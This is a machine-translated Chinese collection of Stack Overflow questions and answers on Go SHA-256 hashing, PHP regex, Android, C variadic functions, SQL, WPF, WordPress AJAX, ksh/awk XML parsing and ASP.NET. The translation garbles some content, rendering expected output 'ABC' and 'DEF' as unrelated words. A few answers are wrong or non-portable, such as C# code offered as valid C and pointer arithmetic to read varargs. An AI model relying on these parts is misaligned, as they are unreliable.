    <% _.each(issue.get('renderings'), function(rendering) { %> 
```

然后访问我的渲染属性，我们这样做：

```
<%= rendering.url %> 
```

例如，不像第一次那样“得到”。

感谢您的参与！

# file - 如何在 Go 中计算 sha256 文件校验和

> ID：15879136
> 
> 赞同：28
> 
> 时间：2013-04-08T12:34:20.823
> 
> 标签：file, io, cryptography, go, sha256

我需要计算 sha256 文件校验和的 Windows 实用程序，这样当我下载 fedora 时，我可以从这里验证校验和：[https ://fedoraproject.org/static/checksums/Fedora-18-i386-CHECKSUM](https://fedoraproject.org/static/checksums/Fedora-18-i386-CHECKSUM)

[来自http://support.microsoft.com/kb/889768](http://support.microsoft.com/kb/889768)的Microsoft 实用程序仅执行 md5 和 sha1。

我不想使用其他未签名且无法从 https 或我不知道的来源获得的可下载工具，因为通过未加密的连接或从不受信任的来源下载未签名的代码进行验证没有任何意义另一个代码的签名以信任它。

幸运的是，谷歌提供了使用 https 进行所有下载的可能性，因此我可以通过安全连接下载 Go 并从那里开始。

这是对小文件执行此操作的简单代码，但对大文件不是很好，因为它不是流式传输的。

```
package main

import (
    "io/ioutil"
    "crypto/sha256"
    "os"
    "log"
    "encoding/hex"
)

func main() {
    hasher := sha256.New()
    s, err := ioutil.ReadFile(os.Args[1])    
    hasher.Write(s)
    if err != nil {
        log.Fatal(err)
    }

    os.Stdout.WriteString(hex.EncodeToString(hasher.Sum(nil)))
} 
```

如何使它使用流，以便它适用于任何文件大小。

* * *

## 回答 #1

> 赞同：30
> 
> 时间：2013-04-09T03:20:19.203

SHA256 散列器实现了该`io.Writer`接口，因此一种选择是使用该`io.Copy()`函数从适当`io.Reader`的 in 块中复制数据。这样的事情应该做：

```
f, err := os.Open(os.Args[1])
if err != nil {
    log.Fatal(err)
}
defer f.Close()
if _, err := io.Copy(hasher, f); err != nil {
    log.Fatal(err)
} 
```

* * *

## 回答 #2

> 赞同：30
> 
> 时间：2017-07-16T00:48:16.657

[crypto/sha256 godoc](https://golang.org/pkg/crypto/sha256)实际上有一个[片段](https://golang.org/pkg/crypto/sha256/#New)显示了如何做到这一点（它与 James 的代码基本相同）：

```
package main

import (
  "crypto/sha256"
  "fmt"
  "io"
  "log"
  "os"
)

func main() {
  f, err := os.Open("file.txt")
  if err != nil {
    log.Fatal(err)
  }
  defer f.Close()

  h := sha256.New()
  if _, err := io.Copy(h, f); err != nil {
    log.Fatal(err)
  }

  fmt.Printf("%x", h.Sum(nil))
} 
```

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2016-11-05T09:12:45.297

md5sum 的完整示例：

```
func md5sum(filePath string) (string, error) {
    file, err := os.Open(filePath)
    if err != nil {
        return "", err
    }
    defer file.Close()

    hash := md5.New()
    if _, err := io.Copy(hash, file); err != nil {
        return "", err
    }
    return hex.EncodeToString(hash.Sum(nil)), nil
} 
```

`EncodeToString`不省略前导 0 字节，因此`fmt.Println(hex.EncodeToString([]byte{0x00, 0x00, 0xA, 0xB, 0xC}))`给出 `00000a0b0c`

# php - 用php在img之后添加字符串

> ID：15879137
> 
> 赞同：2
> 
> 时间：2013-04-08T12:34:20.780
> 
> 标签：php, replace, preg-replace

我需要`div`在 wordpress 上的每个帖子的 img 标签之后添加一个字符串（在这种情况下是 a ）。我知道在哪里做，但我不知道怎么做。我试过`preg_replace`但它不起作用：

```
$content = preg_replace('/<img[^>]+\>/i', '/<img[^>]+\>/i <div...>', $content); 
```

结果我得到`/<img[^>]+\>/i <div...>`而不是 img 后面跟着 . 我能怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:37:13.163

替换部分应该是: `'$0 <div...>'`，这基本上是：用我的模式找到你发现的内容并附加我的 div。

所以你的代码应该像：

```
$content = preg_replace('/<img[^>]+\>/i', '$0 <div...>', $content); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:43:28.533

第二个参数`preg_replace()`应该是替换字符串，而不是另一个正则表达式。您可以使用`$0`（整个匹配）或`$1 ~ $9`您拥有的每个内存捕获。在您的情况下，您没有任何内存捕获（括号之间的内容），因此：

```
$content = preg_replace('/<img[^>]+>/i', '$0 <div...>', $content); 
```

*顺便说一句，您不必`>`在表达式中转义。*

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:42:54.530

```
$content = "<img /> <br/> <img />" ;
$content = preg_replace('/(<img[^>]+\>)/i', '$1 <div></div>', $content);
echo htmlentities($content) ; 
```

# android - 如何去除微调器中的分隔线？

> ID：15879138
> 
> 赞同：6
> 
> 时间：2013-04-08T12:34:21.730
> 
> 标签：android, android-spinner, separator

如何去除微调器中的分隔线？

例如，如何删除/控制这些白色分隔线？

![微调器](https://i.stack.imgur.com/h8esi.jpg)

PS这是行布局：

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="wrap_content"
android:background="@android:color/black">

    <TextView
    android:id="@+id/catalog_spinner_item_textView"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:padding="11dp"
    android:text="@string/CatalogSpinnerItemRowDefaultText"
    android:textSize="18sp"
    android:gravity="center_vertical"/>
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-08-26T13:22:18.500

```
public View getView(int position, View row, ViewGroup container) {
    row=(View) inflater.inflate(R.layout.row_layout_spinner_filter, null);
    TextView tv=(TextView) row.findViewById(R.id.textview_spinner_filter_item_name);
    if(container!=null&&(container instanceof ListView)){
        ListView lv=null;
        try{
            lv=(ListView)container;
        }catch(Exception e){}
        if(lv!=null){
            lv.setDivider(drawable);
            lv.setDividerHeight(height);
        }
    }
    tv.setText(getItem(position));
    return row;
} 
```

ViewGroup 容器以 ListView 或 Spinner 的形式出现，因此您可以捕获 listview 并编辑分隔线。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-06-01T09:13:04.273

在 Spinner 的 xml 中使用

安卓:backgorund="@null"

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2014-01-17T18:30:02.343

定义 Kunal 提到的样式，然后在微调器中将该样式称为 android:style = " "

或者您可以在微调器中使用 android:divider 和 android:dividerHeight 来控制其属性/删除它们。

或者您也可以将分隔线设置为 android:color/transparent。

# ruby - 事件机连接超时处理？

> ID：15879141
> 
> 赞同：2
> 
> 时间：2013-04-08T12:34:27.660
> 
> 标签：ruby, eventmachine

在 EventMachine 中处理 TCP 连接超时问题的标准方法是什么？EventMachine::Connection.send_data 方法不返回 deferable(Future) 因此无法检查 send_data 方法是否由于 TCP 连接超时或其他原因而失败。

# python - 等待子进程的最后一行

> ID：15879145
> 
> 赞同：3
> 
> 时间：2013-04-08T12:34:33.280
> 
> 标签：python, subprocess

如何仅存储从子流程返回的最后一行？

特别是，我从 python 调用了一个子进程，它返回了很多输出行。子进程在一些不可预测（可能很长）的时间后终止，我只需要处理来自 STDOUT 的最后一行。

我可以以某种方式避免存储整个输出并等待最后一个吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:55:43.680

在阅读最后一行之前，您必须处理（并丢弃）每一行。

所以你可以做类似的事情

```
line = None
for line in proc.stdout:
    pass
# now line is either the last line or None.
if line is not None:
    process(line) 
```

# c - 如何使用可变数量的参数来运行

> ID：15879147
> 
> 赞同：-3
> 
> 时间：2013-04-08T12:34:41.230
> 
> 标签：c, function, parameters

我有这个：

```
long int addsquares(int n, ...) 
```

如何访问参数？我不能使用`va_start`并且`va_arg`...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:43:51.500

如果您说您有一个可变参数函数，并且不允许使用可变参数宏 ( `va_xxx`)，那么您必须自己重写这些宏的内容。

除非您可以更改函数原型，但我猜现在也允许这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T13:21:41.880

实施依赖...

预测试

```
long int addsquares(int n, int d1, ...){
    printf("%p,%p\n", &n, &d1);
    return 0L;
} 
```

结果：windows 64bit 系统，vc10 (sizeof int:4)

```
003DFD54,003DFD58 
```

windows 64 位系统，gcc 4.4.3 (sizeof int:4)

```
000000000022FE60,000000000022FE68 
```

对于 vc10：

```
long int addsquares(int n, ...){
    int i, *p = &n;
    long sum = 0L;

    for(i=1;i<=n;++i)
        sum += p[i]*p[i];

    return sum;
} 
```

对于 gcc：

```
long int addsquares(int n, ...){
    int i, *p = &n;
    long sum = 0L;

    for(i=1;i<=n;++i)
        sum += p[i*2]*p[i*2];

    return sum;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:36:22.663

使用数组并将每个参数存储在数组的一个“单元格”中。

```
long int addsquares(int[] parameters)
{
    for (int i = 0; i < parameters.length(); i++)
    {
        //Use current parameter: parameters[i]
    }
} 
```

这是 c# 代码，但我认为它也适用于 c。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T13:02:38.240

查看此线程中的讨论... [C 编译器如何实现具有可变数量参数的函数？](https://stackoverflow.com/questions/2739496/how-does-the-c-compiler-implement-functions-with-variable-numbers-of-arguments)

我想你会发现它会让你朝着正确的方向前进。特别注意关于需要使用其中一个论点作为一种手段来理清其他论点是什么以及在哪里的讨论。

# sql - SQL 计算特定时间的 Shares 价值

> ID：15879148
> 
> 赞同：0
> 
> 时间：2013-04-08T12:34:47.283
> 
> 标签：sql, sql-server, sql-server-2008, tsql, reporting-services

我正在寻找一种方法来计算给定时间股票的价值。

在示例中，我需要计算和报告给定月份的股票赎回情况。

我需要查看 3 个表：

1.  包含赎回日期、赎回股份数量和股份类型的赎回表。

2.  具有共享类型并链接第 1 和第 3 表的共享类型表。

3.  具有股票类型、估值日期、价值的股票价格表。

所以我需要做的是报告并根据股票赎回的数量计算出这些股票按月细分的价值。

那有意义吗？

在此先感谢您的帮助！

抱歉，我想我应该进一步详细说明，因为可能存在一些误解。这不是计算每日变化的股票和股票，更多的是为了基金管理。这意味着股价仅按月变动，而且通常也落后一个月。

这样做的效果是查询需要做的是查看赎回日期，计算出日期，即月份和年份。然后查看股价表，如果有给定日期的股价（这将需要计算，因为它将是一天，即价格是第 y 天的 x），然后将它们的单位数乘以这个值。但是，如果在给定日期没有股票价格，则使用该特定股票类型的最后价格。

希望这可能会更清楚一点，但如果我可以提供任何其他信息以使这更容易，那么请告诉我，我会为您提供信息。

问候，

菲尔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T12:40:26.613

如果您有每天的估值，那么计算是一个简单的连接，然后是一个聚合。结果查询类似于：

```
select year(redemptiondate), month(redemptiondate),
       sum(r.NumShares*sp.Price) as TotalPrice
from Redemptions r left outer join
     ShareType st
     on r.sharetype = st.sharetype left outer join
     SharePrice sp
     on st.sharename = sp.sharename and r.redemptiondate = sp.pricedate
group by year(redemptiondate), month(redemptiondate)
order by 1, 2; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:41:42.187

如果我理解你的问题，你需要一个类似的查询

```
select shares.id, shares.name, sum (redemption.quant * shareprices.price)
from shares 
inner join redemption on shares.id = redemption.share
inner join shareprices on shares.id = shareprices.share
where redemption.curdate between :p1 and :p2
order by shares.id
group by shares.id, shares.name 
```

:p1 和 :p2 是日期参数

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T13:09:06.697

如果您只需要一个日期范围：

```
SELECT s.ShareType, SUM(ISNULL(sp.SharePrice, 0) * ISNULL(r.NumRedemptions, 0)) [RedemptionPrice]
FROM dbo.Shares s   
LEFT JOIN dbo.Redemptions r
    ON r.ShareType = s.ShareType
OUTER APPLY (
    SELECT TOP 1 SharePrice
    FROM dbo.SharePrice p
    WHERE p.ShareType = s.ShareType
    AND p.ValuationDate <= r.RedemptionDate
    ORDER BY p.ValuationDate DESC) sp
WHERE r.RedemptionDate BETWEEN @Date1 AND @Date2
GROUP BY s.ShareType 
```

@Date1 和 @Date2 是您的日期

`ISNULL`检查就在那里，因此如果某些内容为空（它将为 0），它实际上会为您提供一个值。在这种情况下，它是完全可选的，只是个人喜好。

`OUTER APPLY`类似 a的行为`LEFT JOIN`将过滤来自 SharePrice 的结果，以确保您从基于 RedemptionDate 的表中获取最新的 ValuationDate，即使它与该日期不在同一日期范围内。它可能可以通过另一种方式实现，但我觉得这很容易阅读。

如果您对 OUTER APPLY 不满意，您可以在 SELECT 部分使用子查询（即，`ISNULL(r.NumRedemptions, 0) * (/* subquery from dbo.SharePrice here */)`

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T17:19:34.753

这应该可以解决问题（注意：更新为按 ShareType 分组）：

```
SELECT
   ST.ShareType,
   RedemptionMonth = DateAdd(month, DateDiff(month, 0, R.RedemptionDate), 0),
   TotalShareValueRedeemed = Sum(P.SharePrice * R.SharesRedeemed)
FROM
   dbo.Redemption R
   INNER JOIN dbo.ShareType ST
      ON R.ShareTypeID = ST.ShareTypeID
   CROSS APPLY (
      SELECT TOP 1 P.*
      FROM dbo.SharePrice P
      WHERE
         R.ShareTypeID = P.ShareTypeID
         AND R.RedemptionDate >= P.SharePriceDate
      ORDER BY P.SharePriceDate DESC
   ) P
GROUP BY
   ShareType,
   DateAdd(month, DateDiff(month, 0, R.RedemptionDate), 0)
ORDER BY
   ShareType,
   RedemptionMonth
; 
```

[看到它在 Sql Fiddle 中工作](http://sqlfiddle.com/#!3/cb721e/3)。

`Redemption`这可以通过简单地在表上添加带有条件的 WHERE 子句来轻松参数化。如果您需要在没有赎回的月份为共享类型显示 0，请告诉我，我会改进我的答案——如果您稍微填写一下您的用例场景并准确描述，这会有所帮助你想输入什么，你想看到什么作为输出。

另请注意：我在这里假设股票赎回总会有一个价格——如果赎回存在于任何股价之前，则该赎回将被排除在外。

# blackberry-10 - 使用 Native SDK + BB10 发送彩信的问题

> ID：15879156
> 
> 赞同：0
> 
> 时间：2013-04-08T12:35:06.500
> 
> 标签：blackberry-10, blackberry-cascades

我已经完成了发送短信示例应用程序及其工作正常。我已经修改了代码（仅附件），以发送彩信。我在项目的资产文件夹中有一张图片 Lion.jpg。图片大小小于 41KB。

## 以下是修改后的代码：

```
QUrl url("asset:///Lion.jpg");
messageBuilder->addAttachment(bb:im::message::Attachment("image/jpeg", "body.txt", url)); 
```

* * *

其余代码与发送短信相同。代码已正确编译并正常运行。但彩信没有收到另一部手机。我已经在我的设备上检查了收件箱，我的代码正在其中运行。它显示没有图片和红色时钟图标的消息。请帮助我做错了什么。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T18:56:56.933

不幸的是，此时无法以编程方式发送彩信。

# wpf - 绑定到非 UIElement

> ID：15879164
> 
> 赞同：2
> 
> 时间：2013-04-08T12:35:27.543
> 
> 标签：wpf, binding, uielement

我遇到绑定问题。由于`RelativeSource`需要视觉树向上移动并找到所需的祖先，因此您只能在 an 上使用它，`UIElement`但我正在尝试对`RelativeSource`Non-UIElement 进行绑定，例如 ValidationRule，众所周知，它不在内部`VisualTree`也不是它的`UIElement`。正如您所料，绑定中断。`RelativeSource`找不到，因为就像我说的那样没有`VisualTree`或`LogicalTree`可用。我需要让它工作。

下面是 XAML 的一个示例：

```
<StackPanel DataContext{Binding}>
  <Grid>
    <ContentControl Content{Binding MVPart1>
      <TextBox>
       <TextBox.Text>
        <Binding Path="VMPart1Property1">
         <Binding.ValidationRules>
           <my:MyValidationRule>
            <my:ValidationRule.DOC>
             <my:DepObjClass DepProp={Binding Path=DataContext, RelativeSource={RelativeSource FindAncestor, AncestorType={x:Type StackPanel}}}/>
            </my:ValidationRule.DOC>
          </Binding.ValidationRules>
         </Binding>
       </TextBox.Text>
      </TextBox>  
    </ContentControl>
  </Grid>
</StackPanel> 
```

所以基本上 MyValidationRule 派生自 ValidationRule 类，但那不是 UIElement 也不是 DependencyObject，因此我必须创建一个派生自 DependencyObject 的类，称为 DepObjClass 才能写下 xaml 绑定表达式。

这是代码：

```
public class MyValidationRule : ValidationRule
{
  public DepObjClass DOC
  {
    get;
    set;
  }

  public override ValidationResult Validate(object value, System.Globalization.CultureInfo cultureInfo)
  {
      string text = value as string;
      if (!string.IsNullOrEmpty(text))
      {
         return new ValidationResult(true, string.Empty);
      }

      return new ValidationResult(false, "Not working blahhh");
   }
}

public class DepObjClass : DependencyObject
{
  public object DepProp
  {
    get
    {
      return (object)GetValue(DepPropProperty);
    }
    set
    {
      SetValue(DepPropProperty, value);
    }
  }

  public static DependencyProperty DepPropProperty
     = DependencyProperty.Register(typeof(object), typeof(DepObjClass)......);
} 
```

现在来总结一下。MyValidatonRule 不是 UIElement 它不是 DependencyObject 但它具有类型的属性，因此 xaml 绑定表达式编译的原因。

当我运行应用程序时，绑定本身不起作用，因为无法找到 StackPanel，因为 ValidationRule 没有 VisualTree，我的验证规则也没有参与逻辑或可视树。

问题是我如何使这种情况起作用，如何从非 UIElement（例如我的 ValidationRule）中找到 StackPanel？

我为我的代码没有编译而道歉，但我希望你能理解我想要做什么。我给你们50分的正确答案。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-15T20:16:03.043

您可以执行以下操作：

1.  创建一个从 Freezable 派生的辅助组件，并为您要绑定的内容定义一个 DependencyProperty。

2.  创建一个带有属性的 ValidationRule，该属性接受帮助组件的对象，类似于您已经完成的操作。

3.  在对象的资源中声明一个辅助组件的实例，该对象可以绑定到您想要绑定的任何内容。Freezable 及其派生类继承了在其资源中声明它们的任何控件的绑定上下文（逻辑树中的位置），因此您可以在那里创建绑定。

4.  声明 ValidationRule 时，使用 {StaticResource} 将帮助程序组件分配给 ValidationRule 中的属性。只要在使用资源之前声明了资源，StaticResource 就可以在没有绑定上下文的情况下工作。

XAML 看起来像这样：

```
<StackPanel>
  <StackPanel.Resources>
    <my:Helper x:Key="helper" ValProperty="{Binding}"/>
  </StackPanel.Resources>
  <Grid>
      <TextBox DataContext="{Binding MVPart1}">
       <TextBox.Text>
        <Binding Path="VMPart1Property1">
         <Binding.ValidationRules>
           <my:MyValidationRule Helper="{StaticResource helper}"/>
          </Binding.ValidationRules>
         </Binding>
       </TextBox.Text>
      </TextBox>  
  </Grid>
</StackPanel> 
```

# javascript - AJAX url 数据在 Wordpress 中使用友好的 url 发送

> ID：15879165
> 
> 赞同：0
> 
> 时间：2013-04-08T12:35:28.930
> 
> 标签：javascript, php, ajax, wordpress, friendly-url

我正在处理一个 Wordpress 页面，该页面重新加载显示在一个 DIV 中的帖子。重新加载来自单击此 DIV 下列表的任何帖子。

一切正常，但问题是我想维护 Wordpress 的友好 url，而 AJAX 需要在 url 中发送数据。

在前端：

```
<div id="<?php the_ID(); ?>" onClick="inlove_ajax(this.id); return false"> 
```

在 AJAX 文件中：

```
xmlhttp.open("GET","wp-content/themes/37504/ajax_photo_reload.php?q="+str,true); 
```

在 PHP (ajax_photo_reload.php) 中：

```
 require_once("../../../wp-blog-header.php"); 
          $q=$_GET["q"]; 
          query_posts('p='.$q); 
          while (have_posts()) : the_post(); 
```

我正在考虑并尝试不同的解决方案：

*   在 .htacces 中为这些文件添加一个例外
*   使用友好的 url 发送数据的某种方式

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:18:36.557

看了你的帖子，给你两点建议：

*   Wordpress 使用内置的 AJAX 更容易使用 AJAX。它有很多好处，这篇文章是我考虑的一个有用的例子：[通过 AJAX 在 Wordpress 中动态更改导航链接（下一个和上一个）](https://stackoverflow.com/questions/15175020/dynamically-changing-navigation-links-next-and-previous-in-wordpress-via-ajax)。

*   避免在 HTML 标记中使用 Onclick（阅读更多关于不显眼的 JS）。

我来这里是为了提供支持。祝你好运

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:43:45.580

对于 AJAX 请求，不需要维护友好的 URL，因为它们对用户不可见（搜索引擎也不可见）。您应该使用易于解析的格式，就像普通的 GET 参数一样。

# xml - 使用 ksh 脚本从 XML 中提取数据

> ID：15879169
> 
> 赞同：0
> 
> 时间：2013-04-08T12:35:46.557
> 
> 标签：xml, parsing, ksh

由于缺乏信息，我就该主题提出的第一个问题已关闭。因此，再次询问这个问题并添加了更多细节。

我必须从 xml 文件中提取一个标签中给出的值，并且必须使用 ksh 来完成（我可以在 perl 中解决这个问题，但我必须使用 ksh，不能使用第三方工具，如 xmlsh）

示例.xml

```
<?xml version="1.0" standalone="yes" ?>
<parent_one>
  <parent_two>
    <Pool>
      <pool_name>ABC</pool_name>
      <percent_full>79</percent_full>
      <pool_state>Enabled</pool_state>
    </Pool>
    <Pool>
      <pool_name>DEF</pool_name>
      <percent_full>40</percent_full>
      <pool_state>Enabled</pool_state>
    </Pool>
    <Pool>
      <pool_name>XYZ</pool_name>
      <percent_full>40</percent_full>
      <pool_state>Disabled</pool_state>
    </Pool> 
    <Totals>
      <total_tracks>4546456</total_tracks>
      <percent_full>48</percent_full>
    </Totals>
  </parent_two>
</parent_one> 
```

ksh 脚本应该读取 sample.xml 并从 pool_name 标记打印 ABC、DEF，因为相应的 pool_state 标记已启用。它不应该打印 XYZ，因为它的 pool_state 标记被禁用。

ksh 脚本将读取 sample.xml 并输出以下内容

美国广播公司

国防军

这在 ksh 中可行还是我必须为此使用 perl？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-09T22:39:16.140

我已经用 (n)awk 对奇怪的格式文件进行了很多解析。从技术上讲，这可以只用 ksh 来完成，但是 awk（和 perl）更容易......

以下示例使用了**start**和**end**构造`awk`，它只处理**start**和**end**模式之间的行。（在这种情况下`<Pool>`和`</Pool>`。）

除此之外，它很简单，为了清楚起见，使用模仿 xml 元素的变量。

```
awk '/<Pool>/,/<\/Pool>/ {
    if (/<pool_state>/) {
        pool_state=(/<pool_state>Enabled<\/pool_state>/)
    }
    if (/<pool_name>/) {
        if ( gsub(/.*<pool_name>|<\/pool_name>.*/,"") ) {
          pool_name=$0
        }
    }
    if (/<\/Pool>/) {
      if (pool_name && pool_state)
        print pool_name
      unset pool_name
      unset pool_state
    }
}' sample.xml 
```

当 xml 格式错误、多个 Pool 元素列在一行上等时，此代码将严重失败。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-09T23:08:26.097

这个问题的明智解决方案是调用`xmllint --xpath`、[`xqilla -p`](http://xqilla.sourceforge.net/CommandLine)或您最喜欢的 Python/Ruby/Perl 等 XML 库。

否则，您可以查看 Roland Mainz 的 XML 示例并根据您的目的对其进行扩展。

*   [http://svn.nrubsig.org/svn/people/gisburn/scripts/xmldocumenttree1.sh](http://svn.nrubsig.org/svn/people/gisburn/scripts/xmldocumenttree1.sh)
*   [http://svn.nrubsig.org/svn/people/gisburn/scripts/xmlfragmentparse.sh](http://svn.nrubsig.org/svn/people/gisburn/scripts/xmlfragmentparse.sh)

如果您对此非常认真，您可能希望考虑为 ksh 的 libxml2 编写绑定。我认为还没有人这样做过。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T17:34:06.337

话虽如此（我对尝试在没有适当的 XML 解析器的情况下解析 XML 的评论），让我们使用 sed/awk 来试一试，而不是纯 ksh。以[这个答案](https://stackoverflow.com/questions/13670009/remove-block-of-text-between-two-lines-based-on-content)为基础，删除所有设置为的`<Pool></Pool>`块，然后获取包含并捕获标签之间的值的行。如果您的文件看起来像您的示例，这应该可以工作，但如果没有，肯定会中断。`pool_state``Disabled``pool_name``xml`

```
awk '
    /<Pool>/ { rec=""; f=1 }
    f {rec = rec $0 ORS}
    /<\/Pool>/ {
        if (f && (rec !~ "<pool_state>Disabled</pool_state>"))
            printf "%s", rec
            f=0
    }' sample.xml |
grep pool_name |
sed 's#.*>\([^<]*\)<.*#\1#g' 
```

您可以将整个内容放入一个 awk 脚本中，但我认为这可能更容易理解（好吧，我很懒）。

# c# - 在 Asp.Net 中单击 GridView 中的添加按钮时丢失以前的数据

> ID：15879171
> 
> 赞同：0
> 
> 时间：2013-04-08T12:35:50.510
> 
> 标签：c#, asp.net, gridview

我正在使用 C#-4.0 在 Asp.Net 上工作。我想在 GridView 中从最终用户那里获取输入。像

![在此处输入图像描述](https://i.stack.imgur.com/dQHFu.png)

在 DropDownList 或 TextBox 中，我输入一些值并单击“添加”，然后将添加新记录，但以前的数据已丢失。

![在此处输入图像描述](https://i.stack.imgur.com/sa5qd.png)

问题是当我更改控件的值时，它不会保存在它所绑定的 DataTable 中。如何将此值保存到 DataTable。我在这里错过了什么代码？

设计师代码：

```
<%@ Page Title="" Language="C#" MasterPageFile="~/Site.master" AutoEventWireup="true" CodeFile="SaleOrder.aspx.cs" Inherits="Transactions_SaleOrder" %>

<%@ Register assembly="AjaxControlToolkit" namespace="AjaxControlToolkit" tagprefix="asp" %>

<asp:Content ID="Content1" ContentPlaceHolderID="HeadContent" Runat="Server">
    <style type="text/css">
        .style1
        {
            width: 100%;
        }
        </style>
</asp:Content>
<asp:Content ID="Content2" ContentPlaceHolderID="FormHeader" Runat="Server">
    <p>Sale Order</p>
</asp:Content>
<asp:Content ID="Content3" ContentPlaceHolderID="FormBody" Runat="Server">
    <table class="style1">
        <tr>
            <td>
                <asp:Label ID="lblDate" runat="server" Text="Date : "></asp:Label>
<asp:TextBox ID="txtSODate" runat="server"></asp:TextBox>
                <asp:CalendarExtender ID="txtSODate_CalendarExtender" runat="server" 
                    Enabled="True" TargetControlID="txtSODate" Format="dd/MM/yyyy" PopupButtonID="ImageButton1">
                </asp:CalendarExtender>
                <asp:MaskedEditExtender ID="txtSODate_MaskedEditExtender" runat="server" 
                Enabled="True" Mask="99/99/9999" MaskType="Date" TargetControlID="txtSODate">
                </asp:MaskedEditExtender>
                <asp:ImageButton ID="ImageButton1" runat="server" 
                    ImageUrl="~/images/Calendar_scheduleHS.png" />
            </td>
        </tr>
        <tr>
            <td>
                Shift : 
                <asp:DropDownList ID="DropDownList1" runat="server" Width="300px">
                    <asp:ListItem Value="Morning">MORNING</asp:ListItem>
                    <asp:ListItem Value="EVENING"></asp:ListItem>
                    <asp:ListItem Value="OTHERS"></asp:ListItem>
                </asp:DropDownList>
            </td>
        </tr>
        <tr>
            <td>
                <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
                    CellPadding="4" ForeColor="#333333" GridLines="None" 
                    onrowcommand="GridView1_RowCommand">
                    <AlternatingRowStyle BackColor="White" ForeColor="#284775" />
                    <Columns>
                        <asp:TemplateField HeaderText="Product">
                            <ItemTemplate>
                                <asp:DropDownList ID="ddlProduct" runat="server" Width="300"
                                DataSource='<%# dtProductMaster %>'
                                DataTextField="PDescr"
                                DataValueField="PID"
                                >
                                </asp:DropDownList>
                            </ItemTemplate>
                        </asp:TemplateField>
                        <asp:TemplateField HeaderText="Qty">
                            <ItemTemplate>
                                <asp:TextBox ID="txtQuan" runat="server" MaxLength="5" style="text-align:right" Text='<%# BIND("QUAN") %>'></asp:TextBox>
                                <asp:MaskedEditExtender ID="txtQuan_MaskedEditExtender" runat="server" Enabled="True" 
                                    Mask="99999" TargetControlID="txtQuan">
                                </asp:MaskedEditExtender>
                            </ItemTemplate>
                            <ItemStyle HorizontalAlign="Right" />
                        </asp:TemplateField>
                        <asp:ButtonField CommandName="ADD" Text="Add" />
                        <asp:ButtonField CommandName="DELETE" Text="Delete" />
                    </Columns>
                    <EditRowStyle BackColor="#999999" />
                    <FooterStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
                    <HeaderStyle BackColor="#5D7B9D" Font-Bold="True" ForeColor="White" />
                    <PagerStyle BackColor="#284775" ForeColor="White" HorizontalAlign="Center" />
                    <RowStyle BackColor="#F7F6F3" ForeColor="#333333" />
                    <SelectedRowStyle BackColor="#E2DED6" Font-Bold="True" ForeColor="#333333" />
                    <SortedAscendingCellStyle BackColor="#E9E7E2" />
                    <SortedAscendingHeaderStyle BackColor="#506C8C" />
                    <SortedDescendingCellStyle BackColor="#FFFDF8" />
                    <SortedDescendingHeaderStyle BackColor="#6F8DAE" />
                </asp:GridView>
            </td>
        </tr>
        <tr>
            <td>
                <asp:Button ID="btnSave" runat="server" Text="Save" Width="58px" />
            </td>
        </tr>
    </table>
</asp:Content>
<asp:Content ID="Content4" ContentPlaceHolderID="FormFooter" Runat="Server">
</asp:Content> 
```

它背后的 C# 代码：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Data;
public partial class Transactions_SaleOrder : System.Web.UI.Page
{
    internal DataTable dtProductMaster_;
    internal DataTable dtProductMaster
    {
        get
        {
            if (dtProductMaster_ == null)
            {
                clsData d = new clsData();
                d.Select("select PID, PEDESCR2 + ' ' + PEDESCR3 as PDescr From TBLPROD_MAST");
                dtProductMaster_ = d.DataTable;
            }
            return dtProductMaster_;
        }
    }
    DataTable dtProductDet
    {
        get
        {
            if (ViewState["dtProductDet"] != null)
            {
                return (DataTable)ViewState["dtProductDet"];
            }
            else
            {
                return null;
            }
        }
        set
        {
            ViewState["dtProductDet"] = value;
        }
    }

    protected void Page_Load(object sender, EventArgs e)
    {
        if (!Page.IsPostBack)
        {
            txtSODate.Text = DateTime.Now.Date.ToString("dd/MM/yyyy");
            //--
            dtProductDet = new DataTable("dtProductDet");
            dtProductDet.Columns.Add("PID", typeof(int));
            dtProductDet.Columns.Add("PName", typeof(string));
            dtProductDet.Columns.Add("Quan", typeof(decimal));
            dtProductDet.Rows.Add(0,"",0);
            //--
        }
        GridView1.DataSource = dtProductDet;
        GridView1.DataBind();
    }
    protected void GridView1_RowCommand(object sender, GridViewCommandEventArgs e)
    {
        switch (e.CommandName.ToUpper())
        {
            case "ADD":
                dtProductDet.Rows.Add(0, "", 0);
                break;
            case "DELETE":
                dtProductDet.Rows.RemoveAt(Convert.ToInt32(e.CommandArgument));
                break;
        }
    }
} 
```

我怎样才能实现我的目标。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T14:06:10.483

